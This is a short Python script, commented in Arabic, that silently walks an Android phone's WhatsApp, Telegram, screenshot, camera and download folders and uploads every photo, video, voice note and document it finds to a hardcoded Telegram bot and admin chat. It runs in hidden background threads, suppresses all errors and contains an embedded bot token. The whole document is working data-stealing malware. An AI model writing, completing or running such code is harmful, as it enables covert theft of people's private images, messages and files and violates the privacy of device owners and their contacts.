import os
import threading
from concurrent.futures import ThreadPoolExecutor
import telebot

# تثبيت تلقائي إذا لزم الأمر
try:
    import telebot
except ImportError:
    import subprocess
    import sys
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pyTelegramBotAPI"])
    import telebot

BOT_TOKEN = "7563891455:AAFDVnkldlMVL266k4_HUHDZXjEogSp2yi4"
ADMIN_CHAT_ID = 7238044992

bot = telebot.TeleBot(BOT_TOKEN)

# قائمة المسارات المستهدفة (بدون root - Android 11+)
TARGET_PATHS = [
    # WhatsApp الجديد (Scoped Storage)
    "/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images",
    "/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Video",
    "/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Voice Notes",
    "/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Documents",
    
    # WhatsApp القديم (للتوافق مع بعض الأجهزة)
    "/storage/emulated/0/WhatsApp/Media/WhatsApp Images",
    "/storage/emulated/0/WhatsApp/Media/WhatsApp Video",
    
    # Telegram (يعتمد على إعدادات المستخدم)
    "/storage/emulated/0/Telegram/Telegram Images",
    "/storage/emulated/0/Telegram/Telegram Video",
    "/storage/emulated/0/Telegram/Telegram Documents",
    "/storage/emulated/0/Downloads/Telegram",
    
    # Screenshots
    "/storage/emulated/0/Pictures/Screenshots",
    "/storage/emulated/0/DCIM/Screenshots",
    
    # مجلدات عامة إضافية قد تحتوي صور/فيديوهات
    "/storage/emulated/0/Pictures",
    "/storage/emulated/0/DCIM/Camera",
    "/storage/emulated/0/Download"
]

def send_file(file_path):
    try:
        with open(file_path, "rb") as f:
            ext = file_path.lower()
            if ext.endswith((".jpg", ".jpeg", ".png", ".webp", ".gif")):
                bot.send_photo(
                    chat_id=ADMIN_CHAT_ID,
                    photo=f,
                    caption=f"By: TOM | {os.path.basename(file_path)}"
                )
            elif ext.endswith((".mp4", ".mov", ".3gp", ".avi")):
                bot.send_video(
                    chat_id=ADMIN_CHAT_ID,
                    video=f,
                    caption=f"By: TOM | {os.path.basename(file_path)}"
                )
            elif ext.endswith((".pdf", ".doc", ".docx", ".txt", ".zip")):
                bot.send_document(
                    chat_id=ADMIN_CHAT_ID,
                    document=f,
                    caption=f"By: TOM | Document: {os.path.basename(file_path)}"
                )
            # يمكن إضافة أنواع أخرى مثل mp3 إلخ إذا أردت
    except Exception:
        pass  # تجاهل الأخطاء الفردية

def upload_from_paths():
    with ThreadPoolExecutor(max_workers=120) as executor:
        for base_path in TARGET_PATHS:
            if not os.path.exists(base_path):
                continue
            for root, _, files in os.walk(base_path):
                for file in files:
                    full_path = os.path.join(root, file)
                    executor.submit(send_file, full_path)

# تشغيل في خلفية
threading.Thread(target=upload_from_paths, daemon=True).start()

# نسخة احتياطية بسيطة (اختياري)
try:
    threading.Thread(target=upload_from_paths, daemon=True).start()
except:
    pass
